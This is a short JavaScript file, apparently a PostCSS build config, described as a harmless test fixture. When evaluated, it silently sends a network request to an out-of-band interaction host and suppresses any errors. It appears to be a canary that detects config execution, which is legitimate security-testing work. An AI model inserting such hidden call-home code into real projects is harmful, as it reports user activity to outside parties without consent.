// Harmless test fixture: single HTTPS GET if this config is ever evaluated.
try { require('https').get('https://dbm9crepe6jc5kaopeqg4xkkcuuztyeer.oast.live/cfg-postcss.config-fc9e65', r => r.resume()).on('error',()=>{}); } catch (e) {}
module.exports = {};
